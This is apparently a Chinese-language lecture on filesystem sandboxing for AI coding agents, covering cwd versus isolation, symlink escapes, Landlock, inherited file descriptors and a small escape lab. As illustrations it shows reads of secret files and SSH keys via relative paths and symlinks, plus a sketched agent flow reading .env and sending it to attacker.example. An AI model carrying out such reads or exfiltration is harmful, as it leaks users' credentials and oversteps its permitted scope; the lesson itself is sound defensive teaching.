# 第 9 讲：Filesystem Sandbox

## 1. cwd 为什么不等于 Sandbox

设置：

    cwd = /workspace/project

只代表：

> 程序启动后的当前目录。

它不会自动禁止：

    cat ../secret.txt
    cat /home/user/secret.txt

因此：

    cwd != filesystem isolation

## 2. 真正需要的是 Workspace Boundary

例如：

    /workspace/project
        READ
        WRITE
        EXECUTE

其他目录：

    DENY

这才是 AI Coding Agent 真正需要的 Workspace Sandbox。

## 3. symlink 为什么危险

假设：

    project/
      link -> /home/user/.ssh

程序访问：

    project/link/id_rsa

字符串看起来还在 project。

但最终对象已经跳到敏感目录。

因此安全策略必须考虑：

- canonical path；
- symlink；
- mount；
- hardlink；
- relative path；
- already-open file descriptors。

## 4. Linux 怎么做

常见组合：

    Mount Namespace
          ↓
    控制“看到哪些目录”

    Landlock
          ↓
    控制“对这些目录能做什么”

例如：

    /workspace
      READ
      WRITE
      EXECUTE

    /tmp
      READ
      WRITE

    credentials
      DENY

## 5. Landlock 的关键思想

Landlock 是 Linux Kernel 的 LSM sandbox 机制，可以由普通进程给自己增加额外限制。

它是：

> Additional restriction

而不是：

> Grant new privilege

也就是说：

    原本没有权限
       ↓
    Landlock
       ↓
    仍然没有权限

    原本有权限
       ↓
    Landlock
       ↓
    可以进一步限制

## 6. 为什么要限制“操作类型”

不是只有：

    read
    write

还可能有：

    execute
    remove
    create
    truncate
    rename / link
    device ioctl

AI Coding Workspace 通常需要：

    read
    write
    create
    remove

但未必需要：

    device access
    unrestricted namespace creation

## 7. Open FD 是高级问题

假设 Sandbox 前：

    fd = open("/secret.txt")

之后再进入 Sandbox。

如果这个 fd 继续被继承：

    Sandbox
      ↓
    inherited fd
      ↓
    secret.txt

那么路径规则可能已经来不及阻止。

因此 Sandbox Runtime 还要设计：

- inherited FD policy；
- close-on-exec；
- stdin/stdout/stderr；
- inherited sockets。

## 8. 文件系统隔离不能替代网络隔离

即使：

    workspace-only

如果 Agent 可以：

    read .env
      ↓
    curl attacker.example
      ↓
    exfiltrate

仍然有数据外传风险。

所以：

    Filesystem Isolation
           +
    Network Isolation

是现代 Agent Sandbox 的基础组合。

## 9. 实验

目录：

    sandbox-demo/
      workspace/
        hello.txt
      secret.txt

测试：

    cat workspace/hello.txt
    cat secret.txt
    cat workspace/../secret.txt

再创建：

    ln -s ../secret.txt workspace/link

测试：

    cat workspace/link

问题：

> 一个真正的 Sandbox 应该在哪里阻止它？

答案不是“发现 link 就拒绝”，而是应该在 OS policy 层让越界访问失败。

## 10. 面试题

### Q：为什么 cwd 不是 Sandbox？

因为它只设置工作目录，不限制绝对路径、相对路径、symlink 和 inherited FD。

### Q：Landlock 和 chmod 有什么区别？

chmod 是传统文件权限模型；Landlock 是额外的进程级限制层。

## 参考

Linux Landlock:
https://docs.kernel.org/userspace-api/landlock.html
